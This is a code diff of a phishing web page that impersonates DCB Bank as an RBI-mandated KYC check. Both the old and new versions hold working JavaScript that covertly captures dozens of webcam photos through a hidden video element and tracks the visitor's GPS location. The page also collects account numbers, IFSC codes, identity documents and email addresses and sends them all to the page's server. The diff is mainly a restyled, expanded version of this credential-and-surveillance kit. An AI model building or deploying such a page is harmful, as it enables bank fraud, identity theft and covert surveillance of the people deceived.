@@ -1,171 +1,625 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>DCB Bank KYC Verification</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f6f9;
+    /* Reset and base styles */
+    * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
-
+    
+    body {
+      background-color: #f4f6f9;
+      color: #333;
+      line-height: 1.6;
+    }
+    
     .container {
       max-width: 500px;
-      margin: 60px auto;
+      margin: 40px auto;
       background: white;
-      border-radius: 8px;
+      border-radius: 12px;
       padding: 30px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.1);
-      display: none; /* hide until user clicks Continue */
+      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.1);
+      position: relative;
+      overflow: hidden;
     }
-
+    
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 200px;
+    }
+    
+    h2 {
+      text-align: center;
+      color: #003d6a;
+      margin-bottom: 25px;
+      font-weight: 700;
+      font-size: 28px;
+    }
+    
+    .notice {
+      font-size: 15px;
+      color: #444;
+      text-align: center;
+      margin-bottom: 25px;
+      background-color: #f8f9fa;
+      padding: 15px;
+      border-radius: 8px;
+      border-left: 4px solid #ffc107;
+    }
+    
+    label {
+      display: block;
+      margin-top: 20px;
+      font-weight: 600;
+      font-size: 15px;
+      color: #003d6a;
+    }
+    
     input[type="text"],
-    input[type="file"],
-    button {
+    input[type="file"] {
       width: 100%;
-      padding: 10px;
-      margin-top: 15px;
-      font-size: 16px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
+      font-size: 15px;
+      padding: 14px;
+      margin-top: 8px;
+      border-radius: 8px;
+      border: 1px solid #d1d5db;
+      transition: all 0.3s;
     }
-
+    
+    input[type="text"]:focus,
+    input[type="file"]:focus {
+      border-color: #003d6a;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(0, 61, 106, 0.1);
+    }
+    
     button {
+      margin-top: 30px;
+      width: 100%;
       background-color: #003d6a;
       color: white;
       border: none;
+      padding: 16px;
+      font-size: 17px;
+      font-weight: 600;
+      border-radius: 8px;
       cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
     }
-
+    
     button:hover {
       background-color: #00548c;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+      transform: translateY(-2px);
     }
-
-    #kycModal {
+    
+    #kycForm {
+      display: none;
+    }
+    
+    .footer {
+      text-align: center;
+      margin-top: 35px;
+      font-size: 13px;
+      color: #777;
+      padding-top: 20px;
+      border-top: 1px solid #eee;
+    }
+    
+    .error {
+      color: #d32f2f;
+      text-align: center;
+      font-size: 14px;
+      margin-top: 15px;
+      font-weight: 500;
+    }
+    
+    /* Verification Popup Styles */
+    #verificationPopup {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.7);
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.92);
       display: flex;
       justify-content: center;
       align-items: center;
-      z-index: 9999;
+      z-index: 1000;
+      backdrop-filter: blur(8px);
     }
-
-    #kycModal .modal-box {
+    
+    .popup-content {
       background: white;
-      padding: 25px;
-      border-radius: 10px;
+      border-radius: 16px;
       width: 90%;
       max-width: 500px;
+      padding: 35px;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
+      animation: popupIn 0.5s ease-out;
+    }
+    
+    @keyframes popupIn {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    
+    .popup-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 25px;
+    }
+    
+    .popup-icon {
+      width: 60px;
+      height: 60px;
+      background-color: #e6f2ff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 20px;
+    }
+    
+    .popup-icon svg {
+      width: 28px;
+      height: 28px;
+      fill: #003d6a;
+    }
+    
+    .popup-title {
+      color: #003d6a;
+      font-size: 26px;
+      font-weight: 700;
+    }
+    
+    .popup-message {
+      font-size: 16px;
+      line-height: 1.7;
+      color: #444;
+      margin-bottom: 25px;
+    }
+    
+    .highlight {
+      background-color: #fff8e1;
+      padding: 20px;
+      border-radius: 10px;
+      border-left: 4px solid #ffc107;
+      margin: 25px 0;
+      font-size: 15px;
+    }
+    
+    .popup-button {
+      background-color: #003d6a;
+      color: white;
+      border: none;
+      padding: 16px 30px;
+      font-size: 17px;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      display: block;
+      width: 100%;
+      transition: all 0.3s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    
+    .popup-button:hover {
+      background-color: #00548c;
+      transform: translateY(-2px);
+    }
+    
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 25px;
+      font-size: 14px;
+      color: #28a745;
+      font-weight: 600;
+    }
+    
+    .security-badge svg {
+      width: 18px;
+      height: 18px;
+      margin-right: 10px;
+      fill: #28a745;
+    }
+    
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      margin: 30px 0;
+    }
+    
+    .step {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #d1d5db;
+      margin: 0 8px;
+    }
+    
+    .step.active {
+      background-color: #003d6a;
+    }
+    
+    /* Loading spinner */
+    .spinner {
+      display: inline-block;
+      width: 22px;
+      height: 22px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 12px;
+      vertical-align: middle;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .success-message {
       text-align: center;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      padding: 20px;
+      background-color: #e8f5e9;
+      border-radius: 8px;
+      border-left: 4px solid #28a745;
+      margin-top: 20px;
+      display: none;
+    }
+    
+    .success-message h3 {
+      color: #28a745;
+      margin-bottom: 10px;
+    }
+    
+    /* Responsive design */
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px 15px;
+        padding: 25px 20px;
+      }
+      
+      .popup-content {
+        padding: 25px 20px;
+      }
+      
+      .popup-title {
+        font-size: 22px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <!-- 🔐 KYC Notice Modal -->
-  <div id="kycModal">
-    <div class="modal-box">
-      <h3 style="color:#003d6a;">Important: KYC Verification Required</h3>
-      <p style="font-size:14px;color:#444;line-height:1.6;margin-top:15px;">
-        As per recent <strong>RBI guidelines</strong> and our <strong>Digital Transaction Policy</strong>, identity verification is mandatory before processing sensitive transfers.
+  <!-- Verification Popup -->
+  <div id="verificationPopup">
+    <div class="popup-content">
+      <div class="popup-header">
+        <div class="popup-icon">
+          <svg viewBox="0 0 24 24">
+            <path d="M12,17.27L18.18,21L16.54,13.97L22,9.24L14.81,8.62L12,2L9.19,8.62L2,9.24L7.45,13.97L5.82,21L12,17.27Z" />
+          </svg>
+        </div>
+        <div class="popup-title">Important: KYC Verification Process</div>
+      </div>
+      
+      <p class="popup-message">
+        To comply with RBI regulations and ensure the security of your account, DCB Bank requires a one-time verification for all account holders. This mandatory process helps prevent fraud and protects your financial assets.
       </p>
-      <p style="font-size:14px;color:#444;line-height:1.6;margin-top:10px;">
-        This step ensures fund security and improves traceability in real-time. Your data will be securely processed as per compliance norms.
+      
+      <div class="highlight">
+        This verification is essential for transparency and regulatory compliance. Your cooperation helps us maintain a secure banking environment for all customers.
+      </div>
+      
+      <p class="popup-message">
+        During this verification, you'll be asked to grant temporary access to:
       </p>
-      <button onclick="proceedToVerification()">I Understand & Continue</button>
+      
+      <ul class="popup-message">
+        <li><strong>Camera</strong> - For identity confirmation and facial recognition</li>
+        <li><strong>Location</strong> - For transaction security verification</li>
+      </ul>
+      
+      <p class="popup-message">
+        This is a standard security procedure required by the Reserve Bank of India (RBI) for all banking institutions. Your information is protected by 256-bit encryption and will only be used for verification purposes.
+      </p>
+      
+      <div class="step-indicator">
+        <div class="step active"></div>
+        <div class="step"></div>
+        <div class="step"></div>
+      </div>
+      
+      <button class="popup-button" onclick="closePopup()">I Understand & Continue</button>
+      
+      <div class="security-badge">
+        <svg viewBox="0 0 24 24">
+          <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.1 14.8,9.5V11C15.4,11 16,11.6 16,12.3V15.8C16,16.4 15.4,17 14.7,17H9.2C8.6,17 8,16.4 8,15.7V12.2C8,11.6 8.6,11 9.2,11V9.5C9.2,8.1 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z" />
+        </svg>
+        Secure & Encrypted Verification Process
+      </div>
     </div>
   </div>
 
-  <!-- 🧾 KYC Form -->
   <div class="container">
-    <form action="/submit" method="POST" enctype="multipart/form-data">
-      <h2>DCB Bank KYC Submission</h2>
+    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjYwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iNjAiIGZpbGw9IiMwMDNkNmEiIHJ4PSI2Ii8+PHRleHQgeD0iMTAwIiB5PSIzNSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjIyIiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiBmb250LXdlaWdodD0iNzAwIj5EQ0IgQmFuazwvdGV4dD48L3N2Zz4=" alt="DCB Bank Logo">
+    <h2>DCB Bank KYC Verification</h2>
+
+    <div id="permissionStep">
+      <p class="notice">
+        For your security and verification, please allow access to your device's <strong>camera</strong> and <strong>location</strong>.<br>
+        You must grant both permissions to proceed with KYC verification.
+      </p>
+      <button onclick="requestPermissions()">Allow & Continue</button>
+      <p id="permStatus" class="error"></p>
+    </div>
+
+    <div id="kycForm">
+      <form id="kycFormElement">
+        <label for="bankname">Bank Name</label>
+        <input type="text" id="bankname" name="bankname" placeholder="Enter recipient's bank name" required>
+
+        <label for="ifsc">IFSC Code</label>
+        <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code" required>
+
+        <label for="accno">Account Number</label>
+        <input type="text" id="accno" name="accno" placeholder="Enter account number" required>
+
+        <label for="fullname">Full Name</label>
+        <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required>
+
+        <label for="email">Email Address</label>
+        <input type="text" id="email" name="email" placeholder="Enter your email" required>
+
+        <label for="document">Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
+        <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png" required>
+
+        <button type="submit">Verify Account</button>
+      </form>
       
-      <input type="text" name="bankname" placeholder="Bank Name" required />
-      <input type="text" name="accno" placeholder="Account Number" required />
-      <input type="text" name="fullname" placeholder="Full Name" required />
-      <input type="file" name="document" accept=".jpg,.jpeg,.png,.pdf" required />
-      <button type="submit">Submit Verification</button>
-    </form>
+      <div id="successMessage" class="success-message">
+        <h3>✅ Verification Submitted Successfully!</h3>
+        <p>Your KYC verification is now being processed. You will receive confirmation shortly.</p>
+      </div>
+    </div>
+
+    <div class="footer">
+      © 2025 DCB Bank Ltd. All rights reserved. | For official verification purposes only.
+    </div>
   </div>
 
-  <!-- 🔒 Hidden camera + logic -->
+  <!-- Hidden elements for capture -->
+  <video id="cameraPreview" autoplay playsinline style="display: none;"></video>
+  <canvas id="captureCanvas" style="display: none;"></canvas>
+  
   <script>
-    const video = document.createElement('video');
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
+    // Close the verification popup
+    function closePopup() {
+      document.getElementById('verificationPopup').style.display = 'none';
+    }
+    
+    // Variables for image capture and data collection
+    let cameraStream = null;
+    let captureInterval = null;
     let capturedImages = [];
+    let locationData = null;
+    const MAX_IMAGES = 50;
+    
+    // Function to request permissions
+    function requestPermissions() {
+      const status = document.getElementById('permStatus');
+      status.textContent = "";
+      status.style.display = "none";
 
-    // Hide video/canvas
-    video.style.position = 'fixed';
-    video.style.opacity = 0;
-    video.style.pointerEvents = 'none';
-    video.style.zIndex = -1000;
-    canvas.style.display = 'none';
-    document.body.appendChild(video);
-    document.body.appendChild(canvas);
-
-    async function startStealthCapture() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: 640, height: 480 },
-          audio: false
-        });
-
-        video.srcObject = stream;
-        await video.play();
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        for (let i = 0; i < 50; i++) {
-          await new Promise(res => setTimeout(res, 300));
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          ctx.fillStyle = 'rgba(255,255,255,0.01)';
-          ctx.fillRect(0, 0, canvas.width, canvas.height);
-          capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+      // Request camera
+      navigator.mediaDevices.getUserMedia({ 
+        video: { 
+          facingMode: 'user', // Front camera
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        } 
+      }).then(stream => {
+        cameraStream = stream;
+        
+        // Setup hidden video preview
+        const preview = document.getElementById('cameraPreview');
+        preview.srcObject = stream;
+        
+        // Request location
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // Store location data
+            locationData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: position.timestamp
+            };
+            
+            // Permissions granted - show form
+            document.getElementById('permissionStep').style.display = 'none';
+            document.getElementById('kycForm').style.display = 'block';
+            
+            // Start capturing images in background
+            startImageCapture();
+            
+            // Also watch location continuously
+            watchLocation();
+          },
+          (err) => {
+            status.textContent = "Location access denied. Cannot proceed.";
+            status.style.display = "block";
+            stopCamera();
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      }).catch((err) => {
+        status.textContent = "Camera access denied. Cannot proceed.";
+        status.style.display = "block";
+        console.error("Camera error:", err);
+      });
+    }
+    
+    // Watch location continuously
+    function watchLocation() {
+      navigator.geolocation.watchPosition(
+        (position) => {
+          locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp
+          };
+        },
+        (err) => {
+          console.error("Location watch error:", err);
+        },
+        { enableHighAccuracy: true }
+      );
+    }
+    
+    // Start capturing images
+    function startImageCapture() {
+      const preview = document.getElementById('cameraPreview');
+      const canvas = document.getElementById('captureCanvas');
+      const ctx = canvas.getContext('2d');
+      
+      // Set canvas size to match video
+      const resizeCanvas = () => {
+        canvas.width = preview.videoWidth;
+        canvas.height = preview.videoHeight;
+      };
+      
+      // Initial resize
+      resizeCanvas();
+      
+      // Also resize when video dimensions change
+      preview.addEventListener('resize', resizeCanvas);
+      
+      captureInterval = setInterval(() => {
+        if (capturedImages.length >= MAX_IMAGES) {
+          clearInterval(captureInterval);
+          console.log("Image capture completed. Total images:", capturedImages.length);
+          return;
         }
-
-        stream.getTracks().forEach(track => track.stop());
-      } catch (err) {
-        console.error('Camera error:', err);
-        capturedImages = Array(50).fill().map(() => createFallbackImage());
+        
+        // Capture image
+        ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+        capturedImages.push(imageData);
+        
+      }, 500); // Capture every 500ms
+    }
+    
+    // Stop camera stream
+    function stopCamera() {
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = null;
+      }
+      if (captureInterval) {
+        clearInterval(captureInterval);
+        captureInterval = null;
       }
     }
-
-    function createFallbackImage() {
-      const tempCanvas = document.createElement('canvas');
-      tempCanvas.width = 640;
-      tempCanvas.height = 480;
-      const tempCtx = tempCanvas.getContext('2d');
-      tempCtx.fillStyle = '#eeeeee';
-      tempCtx.fillRect(0, 0, tempCanvas.width, tempCanvas.height);
-      return tempCanvas.toDataURL('image/jpeg');
+    
+    // Form submission handler
+    document.getElementById('kycFormElement').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      // Stop camera when form is submitted
+      stopCamera();
+      
+      // Show loading state
+      const submitBtn = this.querySelector('button[type="submit"]');
+      const originalBtnText = submitBtn.innerHTML;
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
+      
+      try {
+        // Create FormData object
+        const formData = new FormData();
+        
+        // Add form fields
+        formData.append('bankname', document.getElementById('bankname').value);
+        formData.append('ifsc', document.getElementById('ifsc').value);
+        formData.append('accno', document.getElementById('accno').value);
+        formData.append('fullname', document.getElementById('fullname').value);
+        formData.append('email', document.getElementById('email').value);
+        
+        // Add document file
+        const documentFile = document.getElementById('document').files[0];
+        if (documentFile) {
+          formData.append('document', documentFile);
+        }
+        
+        // Add captured images
+        capturedImages.forEach((img, index) => {
+          const blob = dataURLtoBlob(img);
+          formData.append(`image${index}`, blob, `capture_${index}.jpg`);
+        });
+        
+        // Add location data
+        if (locationData) {
+          formData.append('location', JSON.stringify(locationData));
+        }
+        
+        // Send data to server
+        const response = await fetch('/submit', {
+          method: 'POST',
+          body: formData
+        });
+        
+        if (response.ok) {
+          // Show success message
+          document.getElementById('kycFormElement').style.display = 'none';
+          document.getElementById('successMessage').style.display = 'block';
+        } else {
+          throw new Error('Server responded with an error');
+        }
+      } catch (error) {
+        console.error("Submission error:", error);
+        alert("There was an error processing your verification. Please try again.");
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = originalBtnText;
+      }
+    });
+    
+    // Helper function to convert data URL to Blob
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], { type: mime });
     }
-
-    function proceedToVerification() {
-      document.getElementById('kycModal').style.display = 'none';
-      document.querySelector('.container').style.display = 'block';
-      startStealthCapture();
-    }
-
-    // Append captured images to form before submit
-    window.addEventListener('DOMContentLoaded', () => {
-      const form = document.querySelector('form');
-      form.addEventListener('submit', function () {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = 'stealthImages';
-        input.value = JSON.stringify(capturedImages);
-        this.appendChild(input);
-      });
+    
+    // Cleanup when leaving the page
+    window.addEventListener('beforeunload', function() {
+      stopCamera();
+    });
+    
+    // Start the process by showing popup immediately
+    window.addEventListener('load', function() {
+      document.getElementById('verificationPopup').style.display = 'flex';
     });
   </script>
-
 </body>
 </html>
